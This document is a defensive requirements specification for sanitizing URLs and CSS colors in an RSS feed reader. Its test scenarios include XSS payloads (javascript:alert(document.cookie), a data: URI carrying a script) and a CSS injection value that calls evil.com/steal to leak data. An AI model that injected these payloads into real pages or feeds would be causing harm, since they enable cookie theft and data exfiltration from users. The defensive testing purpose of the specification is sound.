## ADDED Requirements

### Requirement: URL sanitization for RSS feed links
All `href` attributes rendering links derived from RSS feed data SHALL be sanitized with `sanitizeUrl()` before being placed in the DOM. This prevents `javascript:` URI XSS attacks from malicious or compromised RSS feeds.

#### Scenario: Benign URL passes through
- **WHEN** a feed item contains a link `https://example.com/article`
- **THEN** `sanitizeUrl()` returns `https://example.com/article`
- **AND** the link renders correctly as an external link

#### Scenario: javascript: URI is blocked
- **WHEN** a feed item contains a link `javascript:alert(document.cookie)`
- **THEN** `sanitizeUrl()` returns the fallback `#`
- **AND** the link does not execute JavaScript

#### Scenario: data: URI is blocked
- **WHEN** a feed item contains a link `data:text/html,<script>alert(1)</script>`
- **THEN** `sanitizeUrl()` returns the fallback `#`
- **AND** the link does not execute JavaScript

### Requirement: CSS color sanitization for feed headers
All CSS color values applied via inline `style` attributes derived from API data SHALL be sanitized with `sanitizeCssColor()` before being applied. This prevents CSS injection attacks via crafted header color values.

#### Scenario: Valid hex color passes through
- **WHEN** a feed header has `header_color: "#3b82f6"`
- **THEN** `sanitizeCssColor("#3b82f6", "#64748b")` returns `"#3b82f6"`
- **AND** the background-color style renders correctly

#### Scenario: CSS injection attempt via background-image is blocked
- **WHEN** a feed header has `header_theme_colors.dark.bg: "red; background-image: url(https://evil.com/steal?c=1)"`
- **THEN** `sanitizeCssColor()` returns the fallback `"#64748b"`
- **AND** the CSS injection string is not applied to any style

#### Scenario: rgb() color format is validated
- **WHEN** a feed header has `header_color: "rgb(59, 130, 246)"`
- **THEN** `sanitizeCssColor()` validates against the rgb() pattern and returns the value if valid

#### Scenario: Invalid color format falls back to default
- **WHEN** a feed header has a malformed color value `"; background: red`
- **THEN** `sanitizeCssColor()` returns the fallback `"#64748b"`
